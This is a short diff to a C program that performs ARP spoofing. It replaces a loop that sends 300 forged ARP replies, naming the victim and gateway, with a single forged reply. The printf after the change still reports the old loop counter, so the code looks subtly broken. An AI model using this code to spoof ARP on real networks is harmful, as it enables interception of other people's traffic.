@@ -99,11 +99,8 @@ int main(int argc, char *argv[]){
 	*/
 	
 	printf("\nStart ARP spoofing...\n");
-	for (i = 0; i < 300; i++) {
-		set_arp_packet(pkt, &data.victim_ip, &data.gateway_ip, data.victim_host, ARPOP_REPLY);
-		send_arp_packet(fp, packet);
-		usleep(SEC / 5);
-	}
+	set_arp_packet(pkt, &data.victim_ip, &data.gateway_ip, data.victim_host, ARPOP_REPLY);
+	send_arp_packet(fp, packet);
 	printf("Complete forwarding %d packets.\n", i);
 
 	printf("\nGood Bye~ *^^*\n");
